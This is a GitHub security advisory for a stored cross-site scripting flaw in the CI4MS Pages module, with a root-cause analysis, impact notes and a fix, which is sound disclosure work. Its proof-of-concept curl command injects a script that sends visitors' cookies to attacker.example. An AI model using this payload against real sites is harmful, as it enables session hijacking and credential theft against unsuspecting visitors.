# [M] CI4MS has stored XSS in Pages Content Due to Missing html_purify Sanitization

## Summary
Severity: Medium
Advisory: GHSA-fjpj-6qcq-6pw2
CVE: CVE-2026-39392
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-fjpj-6qcq-6pw2
Type: github-advisory

## Affected
- Packagist: `ci4-cms-erp/ci4ms` — affected >=0 <0.31.4.0

## Details
## Summary

The Pages module does not apply the `html_purify` validation rule to content fields during create and update operations, while the Blog module does. Page content is stored unsanitized in the database and rendered as raw HTML on the public frontend via `echo $pageInfo->content`. An authenticated admin with page-editing privileges can inject arbitrary JavaScript that executes in the browser of every public visitor viewing the page.

## Details

The Blog module correctly applies HTMLPurifier sanitization to content fields:

**`modules/Blog/Controllers/Blog.php:82`**
```php
'lang.*.content' => ['label' => lang('Backend.content'), 'rules' => 'required|html_purify'],
```

The Pages module omits this rule in both create and update methods:

**`modules/Pages/Controllers/Pages.php:82`** (create)
```php
'lang.*.content' => ['label' => lang('Backend.content'), 'rules' => 'required'],
```

**`modules/Pages/Controllers/Pages.php:130`** (update)
```php
'lang.*.content' => ['label' => lang('Backend.content'), 'rules' => 'required'],
```

Content is stored directly without sanitization:

**`modules/Pages/Controllers/Pages.php:111`** (create path)
```php
'content' => $lData['content'],
```

**`modules/Pages/Controllers/Pages.php:157`** (update path)
```php
'content' => $lData['content'],
```

On the public frontend, the content is rendered as raw HTML without escaping:

**`app/Views/templates/default/pages.php:32`**
```php
<?php echo $pageInfo->content ?>
```

Note that the same template correctly escapes the title field on line 9 using `esc($pageInfo->title)`, further confirming the content output is an oversight.

The `html_purify` custom validation rule is defined in `modules/Backend/Validation/CustomRules.php:54-73` and uses the HTMLPurifier library to strip dangerous HTML (script tags, event handlers) while preserving safe rich content. Its absence from the Pages validation is the root cause.

## PoC

**Step 1: Create a page with XSS payload (requires admin session)**
```bash
curl -X POST https://target/backend/pages/create \
  -b 'ci_session=ADMIN_SESSION_COOKIE' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'lang[tr][title]=Test+Page&lang[tr][seflink]=test-xss-page&lang[tr][content]=<p>Normal+content</p><script>document.location="https://attacker.example/?c="%2Bdocument.cookie</script>&isActive=1'
```

**Step 2: Visit the page as any unauthenticated user**
```
https://target/tr/test-xss-page
```

**Expected result:** The `<script>` tag executes in the visitor's browser, sending their cookies to the attacker-controlled server.

## Impact

- **Session hijacking:** Attacker steals session cookies of any visitor, including other administrators
- **Credential theft:** Injected JavaScript can render fake login forms or keylog credentials
- **Site defacement:** Arbitrary HTML/JS can modify the public-facing page for all visitors
- **Malware distribution:** Injected scripts can redirect visitors or load external payloads

The attack requires admin-level authentication (PR:H), but the impact crosses the security boundary to affect all unauthenticated public visitors (S:C). In a multi-admin CMS environment, a lower-privileged admin with only page-editing permissions could compromise higher-privileged admin sessions.

## Recommended Fix

Add the `html_purify` validation rule to both the create and update methods in the Pages controller, consistent with the Blog module:

**`modules/Pages/Controllers/Pages.php:82`** — change:
```php
'lang.*.content' => ['label' => lang('Backend.content'), 'rules' => 'required'],
```
to:
```php
'lang.*.content' => ['label' => lang('Backend.content'), 'rules' => 'required|html_purify'],
```

**`modules/Pages/Controllers/Pages.php:130`** — apply the same change:
```php
'lang.*.content' => ['label' => lang('Backend.content'), 'rules' => 'required|html_purify'],
```

Additionally, as defense-in-depth, escape content output in the view template or use the existing `esc()` helper with the `'raw'` context for trusted HTML, ensuring HTMLPurifier has already processed it before storage.

## References
- https://github.com/ci4-cms-erp/ci4ms/security/advisories/GHSA-fjpj-6qcq-6pw2
- https://nvd.nist.gov/vuln/detail/CVE-2026-39392
- https://github.com/ci4-cms-erp/ci4ms
- https://github.com/ci4-cms-erp/ci4ms/releases/tag/0.31.4.0
